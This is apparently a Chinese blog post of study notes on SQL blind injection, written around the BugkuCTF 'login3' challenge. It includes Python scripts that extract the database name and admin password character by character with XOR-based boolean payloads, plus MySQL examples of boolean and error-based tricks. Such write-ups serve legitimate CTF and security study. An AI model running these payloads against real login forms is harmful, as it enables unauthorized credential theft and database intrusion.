# SQL盲注的技巧

一直在纠结到底是将文件存储在本地呢， 还是直接存在云端

直接保存在云端当然很方便快捷， 但是如果平台垮了， 所有的东东就没了



所以目前采取双备份的形式吧

## bugku login3

之前做bugkuctf的一道web题还没把思路总结下来



先分析脚本

```python
def databasere():
    resutlt=""
    for i in range(30):
        fla = 0
        for j in str_all:

            playlod="admin'^(ascii(mid(database()from({})))<>{})^0#".format(str(i),ord(j))
            data = {
                "username": playlod,
                "password": 123
            }
            s=r.post(url,data)
            #print(playlod)
            #print(s.text)
            
            if "error" in s.text:
                resutlt+=j
                print(resutlt)
            # if fla == 0:
            #     break
    print(resutlt)
```

这个是基于页面回显的信息， 因为只有admin这个用户是存在的

1.  admin ^ 字母 ^ 0  如果database()首字母是a， a！=97 返回为0，则用户名是存在的。 反之如果用户名不存在， 那么database首字母就不为a



另外一个爆破密码的思路也差不太多

代码如下：

```python
def password():
    resutlt=""
    for i in range(40):
        fla=0
        for j in str_all:
            playlod = "admin'^(ascii(mid((select(password)from(admin))from({})))<>{})^0#".format(str(i+1),ord(j))
            data = {
                "username": playlod,
                "password": 1111
            }
            s=r.post(url,data)
            print(playlod)
            if "error" in s.text:
                resutlt+=j
                fla=1
                print('**************************',resutlt)
        if fla==0:
            break
```



## 盲注的分类

大体上三种

```
Booleanbase
Timebase
Errorbase
```



### 布尔盲注



布尔盲注中用到的运算或者操作符可能有 ： `and` , `or` , `if` , `from`, `substring`, `^异或运算`等

```html
mysql> select 123 from dual where 1=1;
+-----+
| 123 |
+-----+
| 123 |
+-----+
1 row in set (0.00 sec)
mysql> select 123 from dual where 1=0;
Empty set (0.00 sec)
```

还有一个if的例子

```html
mysql> select 1 from te order by if(1,1,(select 1 union select 2)) limit 0,3;
+---+
| 1 |
+---+
| 1 |
| 1 |
| 1 |
+---+
3 rows in set (0.00 sec)
mysql> select 1 from te order by if(0,1,(select 1 union select 2)) limit 0,3;
ERROR 1242 (21000): Subquery returns more than 1 row
```





# 参考

[详解SQL盲注测试高级技巧](<https://www.freebuf.com/articles/web/30841.html>)

[浅谈BugkuCTF-writeup](<http://pupiles.com/Bugku-Web-writeup.html>)

